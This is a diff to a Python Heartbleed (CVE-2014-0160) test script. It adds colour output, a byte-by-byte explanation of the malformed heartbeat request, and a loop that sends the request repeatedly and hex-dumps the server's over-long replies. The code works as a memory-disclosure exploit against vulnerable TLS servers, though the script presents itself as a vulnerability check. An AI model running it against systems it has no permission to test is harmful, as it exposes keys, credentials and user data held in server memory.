@@ -15,6 +15,16 @@ import select
 import re
 from optparse import OptionParser
 
+class colors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    END = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
 options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
 options.add_option('-p', '--port', type='int', default=8443, help='TCP port to test (default: 8443)')
 options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')
@@ -44,6 +54,15 @@ hb = h2bin('''
 18 03 02 00 03
 01 40 00
 ''')
+
+# Explanation of heartbeat (hit_hb call):
+#    18      : hearbeat record
+#    03 02   : TLS version
+#    00 03   : length
+#    01      : hearbeat request
+#    40 00   : payload length 16 384 bytes check rfc6520 
+#              The total length of a HeartbeatMessage MUST NOT exceed 2^14
+#              example: FF FF (= 65535 bytes) thus we will received 4 paquets of length 16384 bytes
 
 def hexdump(s):
     for b in xrange(0, len(s), 16):
@@ -97,7 +116,7 @@ def hit_hb(s):
             print 'Received heartbeat response:'
             hexdump(pay)
             if len(pay) > 3:
-                print 'WARNING: server returned more data than it should - server is vulnerable!'
+                print colors.WARNING + 'WARNING' + colors.END + ': server returned more data than it should - server is vulnerable!'
             else:
                 print 'Server processed malformed heartbeat, but did not return any extra data.'
             return True
@@ -132,10 +151,11 @@ def main():
         if typ == 22 and ord(pay[0]) == 0x0E:
             break
 
-    print 'Sending heartbeat request...'
-    sys.stdout.flush()
-    s.send(hb)
-    hit_hb(s)
+    for i in range(opts.num):
+      print 'Sending heartbeat request #' + str(i+1) + '!'
+      sys.stdout.flush()
+      s.send(hb)
+      hit_hb(s)
 
 if __name__ == '__main__':
     main()
